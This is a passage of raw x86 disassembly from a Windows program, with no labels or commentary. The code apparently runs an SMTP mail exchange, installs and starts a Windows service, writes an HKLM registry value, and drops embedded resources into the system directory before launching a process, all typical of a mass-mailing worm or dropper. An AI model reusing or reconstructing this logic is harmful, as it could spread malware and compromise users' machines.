  401651:	f7 d1                	not    %ecx
  401653:	49                   	dec    %ecx
  401654:	51                   	push   %ecx
  401655:	68 34 8e 40 00       	push   $0x408e34
  40165a:	55                   	push   %ebp
  40165b:	e8 90 fb ff ff       	call   0x4011f0
  401660:	83 c4 0c             	add    $0xc,%esp
  401663:	83 f8 ff             	cmp    $0xffffffff,%eax
  401666:	0f 84 67 03 00 00    	je     0x4019d3
  40166c:	68 00 04 00 00       	push   $0x400
  401671:	68 38 92 40 00       	push   $0x409238
  401676:	55                   	push   %ebp
  401677:	e8 e4 fb ff ff       	call   0x401260
  40167c:	83 c4 0c             	add    $0xc,%esp
  40167f:	83 f8 ff             	cmp    $0xffffffff,%eax
  401682:	0f 84 4b 03 00 00    	je     0x4019d3
  401688:	a0 38 92 40 00       	mov    0x409238,%al
  40168d:	3c 34                	cmp    $0x34,%al
  40168f:	74 04                	je     0x401695
  401691:	3c 35                	cmp    $0x35,%al
  401693:	75 0a                	jne    0x40169f
  401695:	c7 05 50 96 40 00 01 	movl   $0x1,0x409650
  40169c:	00 00 00 
  40169f:	3c 32                	cmp    $0x32,%al
  4016a1:	0f 85 24 01 00 00    	jne    0x4017cb
  4016a7:	80 3d 39 92 40 00 35 	cmpb   $0x35,0x409239
  4016ae:	0f 85 de 02 00 00    	jne    0x401992
  4016b4:	38 1d 3a 92 40 00    	cmp    %bl,0x40923a
  4016ba:	0f 85 32 01 00 00    	jne    0x4017f2
  4016c0:	a1 50 96 40 00       	mov    0x409650,%eax
  4016c5:	85 c0                	test   %eax,%eax
  4016c7:	0f 85 c5 02 00 00    	jne    0x401992
  4016cd:	8d 44 24 10          	lea    0x10(%esp),%eax
  4016d1:	50                   	push   %eax
  4016d2:	ff 15 8c 70 40 00    	call   *0x40708c
  4016d8:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  4016dc:	8b 3d 30 71 40 00    	mov    0x407130,%edi
  4016e2:	81 e1 ff ff 00 00    	and    $0xffff,%ecx
  4016e8:	51                   	push   %ecx
  4016e9:	ff d7                	call   *%edi
  4016eb:	8b 1d 34 71 40 00    	mov    0x407134,%ebx
  4016f1:	83 c4 04             	add    $0x4,%esp
  4016f4:	ff d3                	call   *%ebx
  4016f6:	8b f0                	mov    %eax,%esi
  4016f8:	85 f6                	test   %esi,%esi
  4016fa:	7e 0f                	jle    0x40170b
  4016fc:	6a 00                	push   $0x0
  4016fe:	ff d7                	call   *%edi
  401700:	83 c4 04             	add    $0x4,%esp
  401703:	ff d3                	call   *%ebx
  401705:	2b f0                	sub    %eax,%esi
  401707:	85 f6                	test   %esi,%esi
  401709:	7f f1                	jg     0x4016fc
  40170b:	83 c9 ff             	or     $0xffffffff,%ecx
  40170e:	bf ec 83 40 00       	mov    $0x4083ec,%edi
  401713:	33 c0                	xor    %eax,%eax
  401715:	f2 ae                	repnz scas %es:(%edi),%al
  401717:	f7 d1                	not    %ecx
  401719:	2b f9                	sub    %ecx,%edi
  40171b:	8b d1                	mov    %ecx,%edx
  40171d:	8b f7                	mov    %edi,%esi
  40171f:	c1 e9 02             	shr    $0x2,%ecx
  401722:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401727:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401729:	8b ca                	mov    %edx,%ecx
  40172b:	83 e1 03             	and    $0x3,%ecx
  40172e:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401730:	8b 7c 24 28          	mov    0x28(%esp),%edi
  401734:	83 c9 ff             	or     $0xffffffff,%ecx
  401737:	f2 ae                	repnz scas %es:(%edi),%al
  401739:	f7 d1                	not    %ecx
  40173b:	2b f9                	sub    %ecx,%edi
  40173d:	8b f7                	mov    %edi,%esi
  40173f:	8b d1                	mov    %ecx,%edx
  401741:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401746:	83 c9 ff             	or     $0xffffffff,%ecx
  401749:	f2 ae                	repnz scas %es:(%edi),%al
  40174b:	8b ca                	mov    %edx,%ecx
  40174d:	4f                   	dec    %edi
  40174e:	c1 e9 02             	shr    $0x2,%ecx
  401751:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401753:	8b ca                	mov    %edx,%ecx
  401755:	83 e1 03             	and    $0x3,%ecx
  401758:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40175a:	bf 04 84 40 00       	mov    $0x408404,%edi
  40175f:	83 c9 ff             	or     $0xffffffff,%ecx
  401762:	f2 ae                	repnz scas %es:(%edi),%al
  401764:	f7 d1                	not    %ecx
  401766:	2b f9                	sub    %ecx,%edi
  401768:	8b f7                	mov    %edi,%esi
  40176a:	8b d1                	mov    %ecx,%edx
  40176c:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401771:	83 c9 ff             	or     $0xffffffff,%ecx
  401774:	f2 ae                	repnz scas %es:(%edi),%al
  401776:	8b ca                	mov    %edx,%ecx
  401778:	4f                   	dec    %edi
  401779:	c1 e9 02             	shr    $0x2,%ecx
  40177c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40177e:	8b ca                	mov    %edx,%ecx
  401780:	83 e1 03             	and    $0x3,%ecx
  401783:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401785:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  40178a:	83 c9 ff             	or     $0xffffffff,%ecx
  40178d:	f2 ae                	repnz scas %es:(%edi),%al
  40178f:	f7 d1                	not    %ecx
  401791:	49                   	dec    %ecx
  401792:	51                   	push   %ecx
  401793:	68 34 8e 40 00       	push   $0x408e34
  401798:	55                   	push   %ebp
  401799:	e8 52 fa ff ff       	call   0x4011f0
  40179e:	83 c4 0c             	add    $0xc,%esp
  4017a1:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017a4:	0f 84 29 02 00 00    	je     0x4019d3
  4017aa:	68 00 04 00 00       	push   $0x400
  4017af:	68 38 92 40 00       	push   $0x409238
  4017b4:	55                   	push   %ebp
  4017b5:	e8 a6 fa ff ff       	call   0x401260
  4017ba:	83 c4 0c             	add    $0xc,%esp
  4017bd:	83 f8 ff             	cmp    $0xffffffff,%eax
  4017c0:	0f 84 0d 02 00 00    	je     0x4019d3
  4017c6:	a0 38 92 40 00       	mov    0x409238,%al
  4017cb:	3c 34                	cmp    $0x34,%al
  4017cd:	74 04                	je     0x4017d3
  4017cf:	3c 35                	cmp    $0x35,%al
  4017d1:	75 0a                	jne    0x4017dd
  4017d3:	c7 05 50 96 40 00 01 	movl   $0x1,0x409650
  4017da:	00 00 00 
  4017dd:	3c 32                	cmp    $0x32,%al
  4017df:	0f 85 87 00 00 00    	jne    0x40186c
  4017e5:	80 3d 39 92 40 00 35 	cmpb   $0x35,0x409239
  4017ec:	0f 85 a0 01 00 00    	jne    0x401992
  4017f2:	a1 50 96 40 00       	mov    0x409650,%eax
  4017f7:	85 c0                	test   %eax,%eax
  4017f9:	0f 85 93 01 00 00    	jne    0x401992
  4017ff:	bf e4 83 40 00       	mov    $0x4083e4,%edi
  401804:	83 c9 ff             	or     $0xffffffff,%ecx
  401807:	33 c0                	xor    %eax,%eax
  401809:	f2 ae                	repnz scas %es:(%edi),%al
  40180b:	f7 d1                	not    %ecx
  40180d:	2b f9                	sub    %ecx,%edi
  40180f:	8b c1                	mov    %ecx,%eax
  401811:	8b f7                	mov    %edi,%esi
  401813:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401818:	c1 e9 02             	shr    $0x2,%ecx
  40181b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40181d:	8b c8                	mov    %eax,%ecx
  40181f:	33 c0                	xor    %eax,%eax
  401821:	83 e1 03             	and    $0x3,%ecx
  401824:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401826:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  40182b:	83 c9 ff             	or     $0xffffffff,%ecx
  40182e:	f2 ae                	repnz scas %es:(%edi),%al
  401830:	f7 d1                	not    %ecx
  401832:	49                   	dec    %ecx
  401833:	51                   	push   %ecx
  401834:	68 34 8e 40 00       	push   $0x408e34
  401839:	55                   	push   %ebp
  40183a:	e8 b1 f9 ff ff       	call   0x4011f0
  40183f:	83 c4 0c             	add    $0xc,%esp
  401842:	83 f8 ff             	cmp    $0xffffffff,%eax
  401845:	0f 84 88 01 00 00    	je     0x4019d3
  40184b:	68 00 04 00 00       	push   $0x400
  401850:	68 38 92 40 00       	push   $0x409238
  401855:	55                   	push   %ebp
  401856:	e8 05 fa ff ff       	call   0x401260
  40185b:	83 c4 0c             	add    $0xc,%esp
  40185e:	83 f8 ff             	cmp    $0xffffffff,%eax
  401861:	0f 84 6c 01 00 00    	je     0x4019d3
  401867:	a0 38 92 40 00       	mov    0x409238,%al
  40186c:	3c 34                	cmp    $0x34,%al
  40186e:	74 04                	je     0x401874
  401870:	3c 35                	cmp    $0x35,%al
  401872:	75 0a                	jne    0x40187e
  401874:	c7 05 50 96 40 00 01 	movl   $0x1,0x409650
  40187b:	00 00 00 
  40187e:	3c 33                	cmp    $0x33,%al
  401880:	0f 85 fa 00 00 00    	jne    0x401980
  401886:	80 3d 39 92 40 00 35 	cmpb   $0x35,0x409239
  40188d:	0f 85 ff 00 00 00    	jne    0x401992
  401893:	80 3d 3a 92 40 00 34 	cmpb   $0x34,0x40923a
  40189a:	0f 85 f2 00 00 00    	jne    0x401992
  4018a0:	a1 50 96 40 00       	mov    0x409650,%eax
  4018a5:	85 c0                	test   %eax,%eax
  4018a7:	0f 85 e5 00 00 00    	jne    0x401992
  4018ad:	bf b4 83 40 00       	mov    $0x4083b4,%edi
  4018b2:	83 c9 ff             	or     $0xffffffff,%ecx
  4018b5:	33 c0                	xor    %eax,%eax
  4018b7:	f2 ae                	repnz scas %es:(%edi),%al
  4018b9:	f7 d1                	not    %ecx
  4018bb:	2b f9                	sub    %ecx,%edi
  4018bd:	8b d1                	mov    %ecx,%edx
  4018bf:	8b f7                	mov    %edi,%esi
  4018c1:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  4018c6:	c1 e9 02             	shr    $0x2,%ecx
  4018c9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4018cb:	8b ca                	mov    %edx,%ecx
  4018cd:	83 e1 03             	and    $0x3,%ecx
  4018d0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4018d2:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  4018d7:	83 c9 ff             	or     $0xffffffff,%ecx
  4018da:	f2 ae                	repnz scas %es:(%edi),%al
  4018dc:	f7 d1                	not    %ecx
  4018de:	49                   	dec    %ecx
  4018df:	51                   	push   %ecx
  4018e0:	68 34 8e 40 00       	push   $0x408e34
  4018e5:	55                   	push   %ebp
  4018e6:	e8 05 f9 ff ff       	call   0x4011f0
  4018eb:	83 c4 0c             	add    $0xc,%esp
  4018ee:	83 f8 ff             	cmp    $0xffffffff,%eax
  4018f1:	0f 84 dc 00 00 00    	je     0x4019d3
  4018f7:	8b 54 24 24          	mov    0x24(%esp),%edx
  4018fb:	83 c9 ff             	or     $0xffffffff,%ecx
  4018fe:	8b fa                	mov    %edx,%edi
  401900:	33 c0                	xor    %eax,%eax
  401902:	f2 ae                	repnz scas %es:(%edi),%al
  401904:	f7 d1                	not    %ecx
  401906:	49                   	dec    %ecx
  401907:	51                   	push   %ecx
  401908:	52                   	push   %edx
  401909:	55                   	push   %ebp
  40190a:	e8 e1 f8 ff ff       	call   0x4011f0
  40190f:	83 c4 0c             	add    $0xc,%esp
  401912:	83 f8 ff             	cmp    $0xffffffff,%eax
  401915:	0f 84 b8 00 00 00    	je     0x4019d3
  40191b:	bf ac 83 40 00       	mov    $0x4083ac,%edi
  401920:	83 c9 ff             	or     $0xffffffff,%ecx
  401923:	33 c0                	xor    %eax,%eax
  401925:	f2 ae                	repnz scas %es:(%edi),%al
  401927:	f7 d1                	not    %ecx
  401929:	2b f9                	sub    %ecx,%edi
  40192b:	8b c1                	mov    %ecx,%eax
  40192d:	8b f7                	mov    %edi,%esi
  40192f:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401934:	c1 e9 02             	shr    $0x2,%ecx
  401937:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401939:	8b c8                	mov    %eax,%ecx
  40193b:	33 c0                	xor    %eax,%eax
  40193d:	83 e1 03             	and    $0x3,%ecx
  401940:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401942:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  401947:	83 c9 ff             	or     $0xffffffff,%ecx
  40194a:	f2 ae                	repnz scas %es:(%edi),%al
  40194c:	f7 d1                	not    %ecx
  40194e:	49                   	dec    %ecx
  40194f:	51                   	push   %ecx
  401950:	68 34 8e 40 00       	push   $0x408e34
  401955:	55                   	push   %ebp
  401956:	e8 95 f8 ff ff       	call   0x4011f0
  40195b:	83 c4 0c             	add    $0xc,%esp
  40195e:	83 f8 ff             	cmp    $0xffffffff,%eax
  401961:	74 70                	je     0x4019d3
  401963:	68 00 04 00 00       	push   $0x400
  401968:	68 38 92 40 00       	push   $0x409238
  40196d:	55                   	push   %ebp
  40196e:	e8 ed f8 ff ff       	call   0x401260
  401973:	83 c4 0c             	add    $0xc,%esp
  401976:	83 f8 ff             	cmp    $0xffffffff,%eax
  401979:	74 58                	je     0x4019d3
  40197b:	a0 38 92 40 00       	mov    0x409238,%al
  401980:	3c 34                	cmp    $0x34,%al
  401982:	74 04                	je     0x401988
  401984:	3c 35                	cmp    $0x35,%al
  401986:	75 0a                	jne    0x401992
  401988:	c7 05 50 96 40 00 01 	movl   $0x1,0x409650
  40198f:	00 00 00 
  401992:	bf a4 83 40 00       	mov    $0x4083a4,%edi
  401997:	83 c9 ff             	or     $0xffffffff,%ecx
  40199a:	33 c0                	xor    %eax,%eax
  40199c:	f2 ae                	repnz scas %es:(%edi),%al
  40199e:	f7 d1                	not    %ecx
  4019a0:	2b f9                	sub    %ecx,%edi
  4019a2:	8b d1                	mov    %ecx,%edx
  4019a4:	8b f7                	mov    %edi,%esi
  4019a6:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  4019ab:	c1 e9 02             	shr    $0x2,%ecx
  4019ae:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4019b0:	8b ca                	mov    %edx,%ecx
  4019b2:	83 e1 03             	and    $0x3,%ecx
  4019b5:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4019b7:	bf 34 8e 40 00       	mov    $0x408e34,%edi
  4019bc:	83 c9 ff             	or     $0xffffffff,%ecx
  4019bf:	f2 ae                	repnz scas %es:(%edi),%al
  4019c1:	f7 d1                	not    %ecx
  4019c3:	49                   	dec    %ecx
  4019c4:	51                   	push   %ecx
  4019c5:	68 34 8e 40 00       	push   $0x408e34
  4019ca:	55                   	push   %ebp
  4019cb:	e8 20 f8 ff ff       	call   0x4011f0
  4019d0:	83 c4 0c             	add    $0xc,%esp
  4019d3:	55                   	push   %ebp
  4019d4:	e8 83 1c 00 00       	call   0x40365c
  4019d9:	5f                   	pop    %edi
  4019da:	5b                   	pop    %ebx
  4019db:	5e                   	pop    %esi
  4019dc:	5d                   	pop    %ebp
  4019dd:	83 c4 10             	add    $0x10,%esp
  4019e0:	c3                   	ret
  4019e1:	90                   	nop
  4019e2:	90                   	nop
  4019e3:	90                   	nop
  4019e4:	90                   	nop
  4019e5:	90                   	nop
  4019e6:	90                   	nop
  4019e7:	90                   	nop
  4019e8:	90                   	nop
  4019e9:	90                   	nop
  4019ea:	90                   	nop
  4019eb:	90                   	nop
  4019ec:	90                   	nop
  4019ed:	90                   	nop
  4019ee:	90                   	nop
  4019ef:	90                   	nop
  4019f0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4019f4:	56                   	push   %esi
  4019f5:	6a 02                	push   $0x2
  4019f7:	6a 00                	push   $0x0
  4019f9:	50                   	push   %eax
  4019fa:	ff 15 18 70 40 00    	call   *0x407018
  401a00:	8b f0                	mov    %eax,%esi
  401a02:	85 f6                	test   %esi,%esi
  401a04:	75 02                	jne    0x401a08
  401a06:	5e                   	pop    %esi
  401a07:	c3                   	ret
  401a08:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  401a0c:	6a 00                	push   $0x0
  401a0e:	8b 54 24 14          	mov    0x14(%esp),%edx
  401a12:	6a 00                	push   $0x0
  401a14:	8b 44 24 14          	mov    0x14(%esp),%eax
  401a18:	6a 00                	push   $0x0
  401a1a:	6a 00                	push   $0x0
  401a1c:	6a 00                	push   $0x0
  401a1e:	51                   	push   %ecx
  401a1f:	6a 01                	push   $0x1
  401a21:	6a 03                	push   $0x3
  401a23:	6a 10                	push   $0x10
  401a25:	68 ff 01 0f 00       	push   $0xf01ff
  401a2a:	52                   	push   %edx
  401a2b:	50                   	push   %eax
  401a2c:	56                   	push   %esi
  401a2d:	ff 15 1c 70 40 00    	call   *0x40701c
  401a33:	85 c0                	test   %eax,%eax
  401a35:	75 1b                	jne    0x401a52
  401a37:	56                   	push   %esi
  401a38:	ff 15 20 70 40 00    	call   *0x407020
  401a3e:	ff 15 88 70 40 00    	call   *0x407088
  401a44:	33 c9                	xor    %ecx,%ecx
  401a46:	3d 31 04 00 00       	cmp    $0x431,%eax
  401a4b:	0f 94 c1             	sete   %cl
  401a4e:	8b c1                	mov    %ecx,%eax
  401a50:	5e                   	pop    %esi
  401a51:	c3                   	ret
  401a52:	57                   	push   %edi
  401a53:	8b 3d 20 70 40 00    	mov    0x407020,%edi
  401a59:	50                   	push   %eax
  401a5a:	ff d7                	call   *%edi
  401a5c:	56                   	push   %esi
  401a5d:	ff d7                	call   *%edi
  401a5f:	5f                   	pop    %edi
  401a60:	b8 01 00 00 00       	mov    $0x1,%eax
  401a65:	5e                   	pop    %esi
  401a66:	c3                   	ret
  401a67:	90                   	nop
  401a68:	90                   	nop
  401a69:	90                   	nop
  401a6a:	90                   	nop
  401a6b:	90                   	nop
  401a6c:	90                   	nop
  401a6d:	90                   	nop
  401a6e:	90                   	nop
  401a6f:	90                   	nop
  401a70:	8b 44 24 04          	mov    0x4(%esp),%eax
  401a74:	56                   	push   %esi
  401a75:	57                   	push   %edi
  401a76:	6a 02                	push   $0x2
  401a78:	6a 00                	push   $0x0
  401a7a:	50                   	push   %eax
  401a7b:	ff 15 18 70 40 00    	call   *0x407018
  401a81:	8b f8                	mov    %eax,%edi
  401a83:	85 ff                	test   %edi,%edi
  401a85:	75 03                	jne    0x401a8a
  401a87:	5f                   	pop    %edi
  401a88:	5e                   	pop    %esi
  401a89:	c3                   	ret
  401a8a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401a8e:	6a 10                	push   $0x10
  401a90:	51                   	push   %ecx
  401a91:	57                   	push   %edi
  401a92:	ff 15 10 70 40 00    	call   *0x407010
  401a98:	8b f0                	mov    %eax,%esi
  401a9a:	85 f6                	test   %esi,%esi
  401a9c:	75 0c                	jne    0x401aaa
  401a9e:	57                   	push   %edi
  401a9f:	ff 15 20 70 40 00    	call   *0x407020
  401aa5:	5f                   	pop    %edi
  401aa6:	33 c0                	xor    %eax,%eax
  401aa8:	5e                   	pop    %esi
  401aa9:	c3                   	ret
  401aaa:	6a 00                	push   $0x0
  401aac:	6a 00                	push   $0x0
  401aae:	56                   	push   %esi
  401aaf:	ff 15 14 70 40 00    	call   *0x407014
  401ab5:	56                   	push   %esi
  401ab6:	8b 35 20 70 40 00    	mov    0x407020,%esi
  401abc:	ff d6                	call   *%esi
  401abe:	57                   	push   %edi
  401abf:	ff d6                	call   *%esi
  401ac1:	5f                   	pop    %edi
  401ac2:	b8 01 00 00 00       	mov    $0x1,%eax
  401ac7:	5e                   	pop    %esi
  401ac8:	c3                   	ret
  401ac9:	90                   	nop
  401aca:	90                   	nop
  401acb:	90                   	nop
  401acc:	90                   	nop
  401acd:	90                   	nop
  401ace:	90                   	nop
  401acf:	90                   	nop
  401ad0:	8b 44 24 04          	mov    0x4(%esp),%eax
  401ad4:	56                   	push   %esi
  401ad5:	57                   	push   %edi
  401ad6:	68 3f 00 0f 00       	push   $0xf003f
  401adb:	6a 00                	push   $0x0
  401add:	50                   	push   %eax
  401ade:	ff 15 18 70 40 00    	call   *0x407018
  401ae4:	8b f8                	mov    %eax,%edi
  401ae6:	85 ff                	test   %edi,%edi
  401ae8:	75 03                	jne    0x401aed
  401aea:	5f                   	pop    %edi
  401aeb:	5e                   	pop    %esi
  401aec:	c3                   	ret
  401aed:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  401af1:	68 00 00 01 00       	push   $0x10000
  401af6:	51                   	push   %ecx
  401af7:	57                   	push   %edi
  401af8:	ff 15 10 70 40 00    	call   *0x407010
  401afe:	8b f0                	mov    %eax,%esi
  401b00:	85 f6                	test   %esi,%esi
  401b02:	75 0c                	jne    0x401b10
  401b04:	57                   	push   %edi
  401b05:	ff 15 20 70 40 00    	call   *0x407020
  401b0b:	5f                   	pop    %edi
  401b0c:	33 c0                	xor    %eax,%eax
  401b0e:	5e                   	pop    %esi
  401b0f:	c3                   	ret
  401b10:	56                   	push   %esi
  401b11:	ff 15 0c 70 40 00    	call   *0x40700c
  401b17:	56                   	push   %esi
  401b18:	8b 35 20 70 40 00    	mov    0x407020,%esi
  401b1e:	ff d6                	call   *%esi
  401b20:	57                   	push   %edi
  401b21:	ff d6                	call   *%esi
  401b23:	5f                   	pop    %edi
  401b24:	b8 01 00 00 00       	mov    $0x1,%eax
  401b29:	5e                   	pop    %esi
  401b2a:	c3                   	ret
  401b2b:	90                   	nop
  401b2c:	90                   	nop
  401b2d:	90                   	nop
  401b2e:	90                   	nop
  401b2f:	90                   	nop
  401b30:	83 ec 34             	sub    $0x34,%esp
  401b33:	b9 0b 00 00 00       	mov    $0xb,%ecx
  401b38:	8d 44 24 00          	lea    0x0(%esp),%eax
  401b3c:	56                   	push   %esi
  401b3d:	57                   	push   %edi
  401b3e:	be 50 84 40 00       	mov    $0x408450,%esi
  401b43:	8d 7c 24 0c          	lea    0xc(%esp),%edi
  401b47:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401b49:	50                   	push   %eax
  401b4a:	6a 03                	push   $0x3
  401b4c:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401b50:	6a 00                	push   $0x0
  401b52:	51                   	push   %ecx
  401b53:	68 02 00 00 80       	push   $0x80000002
  401b58:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
  401b5a:	ff 15 00 70 40 00    	call   *0x407000
  401b60:	5f                   	pop    %edi
  401b61:	5e                   	pop    %esi
  401b62:	85 c0                	test   %eax,%eax
  401b64:	75 31                	jne    0x401b97
  401b66:	68 28 8c 40 00       	push   $0x408c28
  401b6b:	ff 15 84 70 40 00    	call   *0x407084
  401b71:	8b 54 24 00          	mov    0x0(%esp),%edx
  401b75:	40                   	inc    %eax
  401b76:	50                   	push   %eax
  401b77:	68 28 8c 40 00       	push   $0x408c28
  401b7c:	6a 01                	push   $0x1
  401b7e:	6a 00                	push   $0x0
  401b80:	68 40 84 40 00       	push   $0x408440
  401b85:	52                   	push   %edx
  401b86:	ff 15 04 70 40 00    	call   *0x407004
  401b8c:	8b 44 24 00          	mov    0x0(%esp),%eax
  401b90:	50                   	push   %eax
  401b91:	ff 15 08 70 40 00    	call   *0x407008
  401b97:	83 c4 34             	add    $0x34,%esp
  401b9a:	c3                   	ret
  401b9b:	90                   	nop
  401b9c:	90                   	nop
  401b9d:	90                   	nop
  401b9e:	90                   	nop
  401b9f:	90                   	nop
  401ba0:	81 ec 64 01 00 00    	sub    $0x164,%esp
  401ba6:	53                   	push   %ebx
  401ba7:	55                   	push   %ebp
  401ba8:	56                   	push   %esi
  401ba9:	8b 35 3c 70 40 00    	mov    0x40703c,%esi
  401baf:	57                   	push   %edi
  401bb0:	68 d4 84 40 00       	push   $0x4084d4
  401bb5:	33 db                	xor    %ebx,%ebx
  401bb7:	6a 6a                	push   $0x6a
  401bb9:	53                   	push   %ebx
  401bba:	ff d6                	call   *%esi
  401bbc:	8b 3d 38 70 40 00    	mov    0x407038,%edi
  401bc2:	50                   	push   %eax
  401bc3:	53                   	push   %ebx
  401bc4:	ff d7                	call   *%edi
  401bc6:	8b 2d 34 70 40 00    	mov    0x407034,%ebp
  401bcc:	50                   	push   %eax
  401bcd:	ff d5                	call   *%ebp
  401bcf:	68 d4 84 40 00       	push   $0x4084d4
  401bd4:	6a 69                	push   $0x69
  401bd6:	53                   	push   %ebx
  401bd7:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  401bdb:	ff d6                	call   *%esi
  401bdd:	50                   	push   %eax
  401bde:	53                   	push   %ebx
  401bdf:	ff d7                	call   *%edi
  401be1:	50                   	push   %eax
  401be2:	ff d5                	call   *%ebp
  401be4:	89 44 24 14          	mov    %eax,0x14(%esp)
  401be8:	8d 44 24 70          	lea    0x70(%esp),%eax
  401bec:	68 04 01 00 00       	push   $0x104
  401bf1:	50                   	push   %eax
  401bf2:	ff 15 30 70 40 00    	call   *0x407030
  401bf8:	bf c8 84 40 00       	mov    $0x4084c8,%edi
  401bfd:	83 c9 ff             	or     $0xffffffff,%ecx
  401c00:	33 c0                	xor    %eax,%eax
  401c02:	8d 54 24 70          	lea    0x70(%esp),%edx
  401c06:	f2 ae                	repnz scas %es:(%edi),%al
  401c08:	f7 d1                	not    %ecx
  401c0a:	2b f9                	sub    %ecx,%edi
  401c0c:	53                   	push   %ebx
  401c0d:	8b f7                	mov    %edi,%esi
  401c0f:	8b e9                	mov    %ecx,%ebp
  401c11:	8b fa                	mov    %edx,%edi
  401c13:	83 c9 ff             	or     $0xffffffff,%ecx
  401c16:	f2 ae                	repnz scas %es:(%edi),%al
  401c18:	8b cd                	mov    %ebp,%ecx
  401c1a:	4f                   	dec    %edi
  401c1b:	c1 e9 02             	shr    $0x2,%ecx
  401c1e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c20:	6a 04                	push   $0x4
  401c22:	8b cd                	mov    %ebp,%ecx
  401c24:	6a 02                	push   $0x2
  401c26:	53                   	push   %ebx
  401c27:	83 e1 03             	and    $0x3,%ecx
  401c2a:	6a 02                	push   $0x2
  401c2c:	8d 84 24 84 00 00 00 	lea    0x84(%esp),%eax
  401c33:	68 00 00 00 40       	push   $0x40000000
  401c38:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401c3a:	50                   	push   %eax
  401c3b:	ff 15 2c 70 40 00    	call   *0x40702c
  401c41:	8b f0                	mov    %eax,%esi
  401c43:	83 fe ff             	cmp    $0xffffffff,%esi
  401c46:	0f 84 af 01 00 00    	je     0x401dfb
  401c4c:	8b 54 24 10          	mov    0x10(%esp),%edx
  401c50:	8b 2d 54 70 40 00    	mov    0x407054,%ebp
  401c56:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401c5a:	53                   	push   %ebx
  401c5b:	51                   	push   %ecx
  401c5c:	68 00 04 00 00       	push   $0x400
  401c61:	52                   	push   %edx
  401c62:	56                   	push   %esi
  401c63:	ff d5                	call   *%ebp
  401c65:	8b 7c 24 14          	mov    0x14(%esp),%edi
  401c69:	c7 44 24 10 11 00 00 	movl   $0x11,0x10(%esp)
  401c70:	00 
  401c71:	8d 44 24 18          	lea    0x18(%esp),%eax
  401c75:	53                   	push   %ebx
  401c76:	50                   	push   %eax
  401c77:	68 00 04 00 00       	push   $0x400
  401c7c:	57                   	push   %edi
  401c7d:	56                   	push   %esi
  401c7e:	ff d5                	call   *%ebp
  401c80:	8b 44 24 10          	mov    0x10(%esp),%eax
  401c84:	81 c7 00 04 00 00    	add    $0x400,%edi
  401c8a:	48                   	dec    %eax
  401c8b:	89 44 24 10          	mov    %eax,0x10(%esp)
  401c8f:	75 e0                	jne    0x401c71
  401c91:	8b 54 24 14          	mov    0x14(%esp),%edx
  401c95:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401c99:	53                   	push   %ebx
  401c9a:	51                   	push   %ecx
  401c9b:	81 c2 00 44 00 00    	add    $0x4400,%edx
  401ca1:	68 21 06 00 00       	push   $0x621
  401ca6:	52                   	push   %edx
  401ca7:	56                   	push   %esi
  401ca8:	ff d5                	call   *%ebp
  401caa:	56                   	push   %esi
  401cab:	ff 15 7c 70 40 00    	call   *0x40707c
  401cb1:	bf c4 84 40 00       	mov    $0x4084c4,%edi
  401cb6:	83 c9 ff             	or     $0xffffffff,%ecx
  401cb9:	33 c0                	xor    %eax,%eax
  401cbb:	8d 54 24 70          	lea    0x70(%esp),%edx
  401cbf:	f2 ae                	repnz scas %es:(%edi),%al
  401cc1:	f7 d1                	not    %ecx
  401cc3:	2b f9                	sub    %ecx,%edi
  401cc5:	c7 44 24 2c 44 00 00 	movl   $0x44,0x2c(%esp)
  401ccc:	00 
  401ccd:	8b f7                	mov    %edi,%esi
  401ccf:	8b e9                	mov    %ecx,%ebp
  401cd1:	8b fa                	mov    %edx,%edi
  401cd3:	83 c9 ff             	or     $0xffffffff,%ecx
  401cd6:	f2 ae                	repnz scas %es:(%edi),%al
  401cd8:	8b cd                	mov    %ebp,%ecx
  401cda:	4f                   	dec    %edi
  401cdb:	c1 e9 02             	shr    $0x2,%ecx
  401cde:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401ce0:	8b cd                	mov    %ebp,%ecx
  401ce2:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  401ce6:	83 e1 03             	and    $0x3,%ecx
  401ce9:	50                   	push   %eax
  401cea:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401cec:	8d 4c 24 30          	lea    0x30(%esp),%ecx
  401cf0:	8b 2d 80 70 40 00    	mov    0x407080,%ebp
  401cf6:	51                   	push   %ecx
  401cf7:	53                   	push   %ebx
  401cf8:	53                   	push   %ebx
